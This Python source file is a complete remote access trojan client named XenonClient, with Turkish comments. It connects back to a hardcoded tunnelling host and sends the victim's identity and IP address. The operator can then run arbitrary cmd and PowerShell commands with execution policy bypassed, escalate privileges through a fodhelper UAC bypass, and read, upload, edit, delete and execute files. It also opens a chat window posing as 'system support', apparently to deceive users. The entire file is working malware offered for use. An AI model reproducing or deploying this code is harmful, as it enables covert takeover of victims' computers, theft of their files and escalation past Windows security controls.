import socket
import threading
import subprocess
import os
import platform
import json
import webbrowser
import time
import tkinter as tk
from tkinter import messagebox, scrolledtext
import winreg
import base64
import tempfile
import urllib.request

# --- BAĞLANTI AYARLARI ---
HOST = "uwtd3ffva.localto.net"
PORT = 9387
# -------------------------

class XenonClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.chat_win = None
        self.chat_box = None
        self.chat_running = False
        self.current_dir = os.getcwd()  # Shell için geçerli dizin

    # ---------- SİSTEM BİLGİSİ ----------
    def get_sys_info(self):
        try:
            with urllib.request.urlopen('https://api.ipify.org', timeout=5) as resp:
                public_ip = resp.read().decode('utf-8')
        except:
            public_ip = "Unknown"
        try:
            with urllib.request.urlopen('https://ipapi.co/country/', timeout=5) as resp:
                country = resp.read().decode('utf-8').strip()
        except:
            country = "TR"
        return json.dumps({
            "id": f"{os.getlogin()}@{platform.node()}",
            "ip": public_ip,
            "country": country,
            "os": f"{platform.system()} {platform.release()}"
        })

    # ---------- UAC BYPASS ----------
    def uac_bypass(self, cmd_to_run):
        try:
            path = r"Software\Classes\ms-settings\Shell\Open\command"
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, path)
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd_to_run)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            subprocess.Popen("fodhelper.exe", shell=True)
            time.sleep(2)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
            return True
        except:
            return False

    # ---------- BAĞLANTI VE ANA DÖNGÜ ----------
    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))
                self.sock.send(self.get_sys_info().encode("utf-8"))
                self.listen()
            except:
                time.sleep(5)

    def listen(self):
        while True:
            try:
                data = self.sock.recv(16384).decode("utf-8")
                if not data:
                    break

                # ----- MESAJ -----
                if data.startswith("msg|"):
                    threading.Thread(target=lambda: messagebox.showinfo("Duyuru", data.split("|")[1])).start()

                # ----- SOHBET -----
                elif data == "chat_open":
                    if not self.chat_running:
                        threading.Thread(target=self.gui_chat, daemon=True).start()

                elif data.startswith("chat_msg|"):
                    if self.chat_box:
                        try:
                            self.chat_box.config(state="normal")
                            self.chat_box.insert(tk.END, f"DESTEK: {data.split('|')[1]}\n")
                            self.chat_box.config(state="disabled")
                            self.chat_box.see(tk.END)
                        except:
                            pass

                elif data == "chat_close":
                    if self.chat_win:
                        self.chat_running = False
                        try:
                            self.chat_win.quit()
                        except:
                            pass

                # ----- SES ÇAL (BEEP) -----
                elif data == "beep":
                    if platform.system() == "Windows":
                        import winsound
                        winsound.Beep(800, 500)

                # ----- URL AÇ -----
                elif data.startswith("open_url|"):
                    webbrowser.open(data.split("|")[1])

                # ----- SHELL KOMUTLARI (GÜNCELLENMİŞ) -----
                elif data.startswith("shell|"):
                    cmd = data.split("|", 1)[1]
                    threading.Thread(target=self.run_cmd, args=(cmd, "cmd"), daemon=True).start()

                elif data.startswith("ps|"):
                    cmd = data.split("|", 1)[1]
                    threading.Thread(target=self.run_cmd, args=(cmd, "powershell"), daemon=True).start()

                # ----- YÖNETİCİ BYPASS -----
                elif data.startswith("elevate|"):
                    target = "cmd.exe" if "cmd" in data else "powershell.exe"
                    self.uac_bypass(target)

                # ----- SES DOSYASI ÇAL -----
                elif data.startswith("playsound|"):
                    parts = data.split("|", 2)
                    if len(parts) == 3:
                        filename = parts[1]
                        encoded = parts[2]
                        threading.Thread(target=self.play_audio, args=(filename, encoded), daemon=True).start()

                # ----- DOSYA YÖNETİCİSİ KOMUTLARI -----
                elif data.startswith("file_list|"):
                    path = data.split("|", 1)[1]
                    threading.Thread(target=self.handle_file_list, args=(path,), daemon=True).start()

                elif data.startswith("file_download|"):
                    path = data.split("|", 1)[1]
                    threading.Thread(target=self.handle_file_download, args=(path,), daemon=True).start()

                elif data.startswith("file_upload|"):
                    parts = data.split("|", 2)
                    if len(parts) == 3:
                        remote_path = parts[1]
                        encoded = parts[2]
                        threading.Thread(target=self.handle_file_upload, args=(remote_path, encoded), daemon=True).start()

                elif data.startswith("file_delete|"):
                    path = data.split("|", 1)[1]
                    threading.Thread(target=self.handle_file_delete, args=(path,), daemon=True).start()

                elif data.startswith("file_execute|"):
                    path = data.split("|", 1)[1]
                    threading.Thread(target=self.handle_file_execute, args=(path,), daemon=True).start()

                elif data.startswith("file_edit_get|"):
                    path = data.split("|", 1)[1]
                    threading.Thread(target=self.handle_file_edit_get, args=(path,), daemon=True).start()

                elif data.startswith("file_edit_save|"):
                    parts = data.split("|", 2)
                    if len(parts) == 3:
                        path = parts[1]
                        content = parts[2]
                        threading.Thread(target=self.handle_file_edit_save, args=(path, content), daemon=True).start()

                elif data.startswith("file_mkdir|"):
                    path = data.split("|", 1)[1]
                    threading.Thread(target=self.handle_file_mkdir, args=(path,), daemon=True).start()

                elif data.startswith("file_touch|"):
                    path = data.split("|", 1)[1]
                    threading.Thread(target=self.handle_file_touch, args=(path,), daemon=True).start()

                elif data.startswith("file_rename|"):
                    parts = data.split("|", 2)
                    if len(parts) == 3:
                        old = parts[1]
                        new = parts[2]
                        threading.Thread(target=self.handle_file_rename, args=(old, new), daemon=True).start()

                elif data.startswith("file_copy|"):
                    parts = data.split("|", 2)
                    if len(parts) == 3:
                        src = parts[1]
                        dest = parts[2]  # hedef boş olabilir, panoya kopyala
                        threading.Thread(target=self.handle_file_copy, args=(src, dest), daemon=True).start()

                elif data.startswith("file_cut|"):
                    parts = data.split("|", 2)
                    if len(parts) == 3:
                        src = parts[1]
                        dest = parts[2]
                        threading.Thread(target=self.handle_file_cut, args=(src, dest), daemon=True).start()

                elif data.startswith("file_paste|"):
                    dest = data.split("|", 1)[1]
                    threading.Thread(target=self.handle_file_paste, args=(dest,), daemon=True).start()

                elif data.startswith("file_properties|"):
                    path = data.split("|", 1)[1]
                    threading.Thread(target=self.handle_file_properties, args=(path,), daemon=True).start()

                elif data.startswith("file_zip|"):
                    path = data.split("|", 1)[1]
                    threading.Thread(target=self.handle_file_zip, args=(path,), daemon=True).start()

                elif data.startswith("file_unzip|"):
                    path = data.split("|", 1)[1]
                    threading.Thread(target=self.handle_file_unzip, args=(path,), daemon=True).start()

                elif data.startswith("watch_folder|"):
                    parts = data.split("|", 2)
                    if len(parts) == 3:
                        folder = parts[1]
                        action = parts[2]
                        threading.Thread(target=self.handle_watch_folder, args=(folder, action), daemon=True).start()

            except Exception as e:
                print(f"Listen hatası: {e}")
                break
        if self.sock:
            self.sock.close()

    # ---------- SHELL KOMUT ÇALIŞTIRMA (GÜNCELLENMİŞ) ----------
    def run_cmd(self, command_to_run, mode):
        try:
            if mode == "powershell":
                full_cmd = f"powershell -ExecutionPolicy Bypass -Command {command_to_run}"
            else:
                full_cmd = command_to_run

            proc = subprocess.Popen(full_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE, cwd=self.current_dir)
            stdout, stderr = proc.communicate()
            output = (stdout + stderr).decode("cp857", errors="replace")
            if not output.strip():
                output = "Komut çalıştırıldı (Çıktı yok)."

            # Geçerli dizini güncelle (eğer komut cd ise)
            if command_to_run.strip().startswith("cd"):
                # Basit bir cd işlemi, yeni dizini almaya çalış
                if platform.system() == "Windows":
                    new_dir = subprocess.run("cd", shell=True, capture_output=True, text=True, cwd=self.current_dir).stdout.strip()
                else:
                    new_dir = subprocess.run("pwd", shell=True, capture_output=True, text=True, cwd=self.current_dir).stdout.strip()
                if new_dir:
                    self.current_dir = new_dir
            else:
                # Diğer komutlar için de dizin değişmiş olabilir, kontrol et
                if platform.system() == "Windows":
                    current = subprocess.run("cd", shell=True, capture_output=True, text=True, cwd=self.current_dir).stdout.strip()
                else:
                    current = subprocess.run("pwd", shell=True, capture_output=True, text=True, cwd=self.current_dir).stdout.strip()
                if current:
                    self.current_dir = current

            # Sunucuya dizinle birlikte gönder
            self.sock.send(f"shell_res|{self.current_dir}|{output}".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"shell_res|{self.current_dir}|Hata: {str(e)}".encode("utf-8"))

    # ---------- SES DOSYASI ÇAL ----------
    def play_audio(self, filename, encoded):
        try:
            data = base64.b64decode(encoded)
            suffix = os.path.splitext(filename)[1]
            with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as f:
                f.write(data)
                temp_path = f.name
            self.play_sound_file(temp_path)
            threading.Timer(10, lambda: os.unlink(temp_path)).start()
        except Exception as e:
            print(f"[!] Ses çalma hatası: {e}")

    def play_sound_file(self, file_path):
        try:
            from playsound import playsound
            playsound(file_path)
        except ImportError:
            system = platform.system()
            try:
                import pygame
                pygame.mixer.init()
                pygame.mixer.music.load(file_path)
                pygame.mixer.music.play()
                while pygame.mixer.music.get_busy():
                    time.sleep(0.1)
                pygame.mixer.quit()
            except ImportError:
                if system == "Windows":
                    if file_path.lower().endswith('.wav'):
                        import winsound
                        winsound.PlaySound(file_path, winsound.SND_FILENAME)
                    else:
                        os.startfile(file_path)
                elif system == "Linux":
                    os.system(f"aplay '{file_path}' 2>/dev/null || paplay '{file_path}'")
                elif system == "Darwin":
                    os.system(f"afplay '{file_path}'")
                else:
                    print("Desteklenmeyen işletim sistemi")

    # ---------- DOSYA YÖNETİCİSİ İŞLEMLERİ ----------
    def handle_file_list(self, path):
        try:
            items = []
            for entry in os.listdir(path):
                full = os.path.join(path, entry)
                is_dir = os.path.isdir(full)
                size = os.path.getsize(full) if not is_dir else 0
                modified = os.path.getmtime(full)
                items.append({
                    "name": entry,
                    "is_dir": is_dir,
                    "size": size,
                    "modified": modified
                })
            result = json.dumps(items)
            self.sock.send(f"file_res|list|{path}|{result}".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|error|{path}|{str(e)}".encode("utf-8"))

    def handle_file_download(self, path):
        try:
            with open(path, "rb") as f:
                data = f.read()
            encoded = base64.b64encode(data).decode('utf-8')
            self.sock.send(f"file_res|download|{path}|{encoded}".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|error|{path}|{str(e)}".encode("utf-8"))

    def handle_file_upload(self, remote_path, encoded):
        try:
            data = base64.b64decode(encoded)
            with open(remote_path, "wb") as f:
                f.write(data)
            self.sock.send(f"file_res|upload|{remote_path}|success".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|error|{remote_path}|{str(e)}".encode("utf-8"))

    def handle_file_delete(self, path):
        try:
            if os.path.isdir(path):
                os.rmdir(path)  # sadece boş klasör
            else:
                os.remove(path)
            self.sock.send(f"file_res|delete|{path}|ok".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|error|{path}|{str(e)}".encode("utf-8"))

    def handle_file_execute(self, path):
        try:
            if platform.system() == "Windows":
                os.startfile(path)
            else:
                subprocess.Popen([path])
            self.sock.send(f"file_res|execute|{path}|ok".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|error|{path}|{str(e)}".encode("utf-8"))

    def handle_file_edit_get(self, path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                content = f.read()
            self.sock.send(f"file_res|edit_get|{path}|{content}".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|error|{path}|{str(e)}".encode("utf-8"))

    def handle_file_edit_save(self, path, content):
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write(content)
            self.sock.send(f"file_res|edit_save|{path}|ok".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|error|{path}|{str(e)}".encode("utf-8"))

    def handle_file_mkdir(self, path):
        try:
            os.makedirs(path, exist_ok=True)
            self.sock.send(f"file_res|mkdir|{path}|ok".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|error|{path}|{str(e)}".encode("utf-8"))

    def handle_file_touch(self, path):
        try:
            with open(path, "a"):
                os.utime(path, None)
            self.sock.send(f"file_res|touch|{path}|ok".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|error|{path}|{str(e)}".encode("utf-8"))

    def handle_file_rename(self, old, new):
        try:
            os.rename(old, new)
            self.sock.send(f"file_res|rename|{new}|ok".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|error|{old}|{str(e)}".encode("utf-8"))

    # Basit bir pano (kopyala/kes/yapıştır) için global değişkenler
    clipboard = None  # (kaynak_yol, kes_mi)
    def handle_file_copy(self, src, dest):
        # dest boş ise sadece panoya kopyala
        if not dest:
            XenonClient.clipboard = (src, False)
            self.sock.send(f"file_res|copy|{src}|ok".encode("utf-8"))
        else:
            # hedef verilmişse direkt kopyala
            try:
                import shutil
                if os.path.isdir(src):
                    shutil.copytree(src, os.path.join(dest, os.path.basename(src)))
                else:
                    shutil.copy2(src, dest)
                self.sock.send(f"file_res|copy|{dest}|ok".encode("utf-8"))
            except Exception as e:
                self.sock.send(f"file_res|error|{src}|{str(e)}".encode("utf-8"))

    def handle_file_cut(self, src, dest):
        if not dest:
            XenonClient.clipboard = (src, True)
            self.sock.send(f"file_res|cut|{src}|ok".encode("utf-8"))
        else:
            try:
                import shutil
                shutil.move(src, dest)
                self.sock.send(f"file_res|cut|{dest}|ok".encode("utf-8"))
            except Exception as e:
                self.sock.send(f"file_res|error|{src}|{str(e)}".encode("utf-8"))

    def handle_file_paste(self, dest):
        if XenonClient.clipboard is None:
            self.sock.send(f"file_res|error|paste|Pano boş".encode("utf-8"))
            return
        src, is_cut = XenonClient.clipboard
        try:
            import shutil
            if is_cut:
                shutil.move(src, dest)
                XenonClient.clipboard = None
            else:
                if os.path.isdir(src):
                    shutil.copytree(src, os.path.join(dest, os.path.basename(src)))
                else:
                    shutil.copy2(src, dest)
            self.sock.send(f"file_res|paste|{dest}|ok".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|error|paste|{str(e)}".encode("utf-8"))

    def handle_file_properties(self, path):
        try:
            stat = os.stat(path)
            info = {
                "path": path,
                "size": stat.st_size,
                "modified": time.ctime(stat.st_mtime),
                "created": time.ctime(stat.st_ctime),
                "is_dir": os.path.isdir(path)
            }
            self.sock.send(f"file_res|properties|{path}|{json.dumps(info)}".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|error|{path}|{str(e)}".encode("utf-8"))

    def handle_file_zip(self, path):
        try:
            import zipfile
            zip_name = path + ".zip"
            with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zf:
                if os.path.isdir(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            zf.write(os.path.join(root, file),
                                     os.path.relpath(os.path.join(root, file),
                                                     os.path.join(path, '..')))
                else:
                    zf.write(path, os.path.basename(path))
            self.sock.send(f"file_res|zip|{zip_name}|ok".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|error|{path}|{str(e)}".encode("utf-8"))

    def handle_file_unzip(self, path):
        try:
            import zipfile
            extract_dir = os.path.splitext(path)[0]
            with zipfile.ZipFile(path, 'r') as zf:
                zf.extractall(extract_dir)
            self.sock.send(f"file_res|unzip|{extract_dir}|ok".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|error|{path}|{str(e)}".encode("utf-8"))

    def handle_watch_folder(self, folder, action):
        # watchdog ile izleme başlat/durdur
        pass

    # ---------- SOHBET GUI ----------
    def gui_chat(self):
        self.chat_running = True
        self.chat_win = tk.Tk()
        self.chat_win.title("Sistem Destek")
        self.chat_win.geometry("350x450")
        self.chat_win.attributes("-topmost", True)
        
        self.chat_box = scrolledtext.ScrolledText(self.chat_win, state="disabled")
        self.chat_box.pack(expand=True, fill="both", padx=5, pady=5)
        
        ent = tk.Entry(self.chat_win)
        ent.pack(fill="x", padx=5, pady=5)

        def send_srv(e=None):
            m = ent.get()
            if m:
                self.chat_box.config(state="normal")
                self.chat_box.insert(tk.END, f"Siz: {m}\n")
                self.chat_box.config(state="disabled")
                ent.delete(0, tk.END)
                try:
                    self.sock.send(f"chat|{m}".encode("utf-8"))
                except:
                    pass
        
        ent.bind("<Return>", send_srv)
        
        def on_closing():
            self.chat_running = False
            self.chat_win.destroy()
            self.chat_win = None
            self.chat_box = None
            
        self.chat_win.protocol("WM_DELETE_WINDOW", on_closing)
        self.chat_win.mainloop()
        self.chat_running = False
        self.chat_win = None


if __name__ == "__main__":
    XenonClient(HOST, PORT).connect()
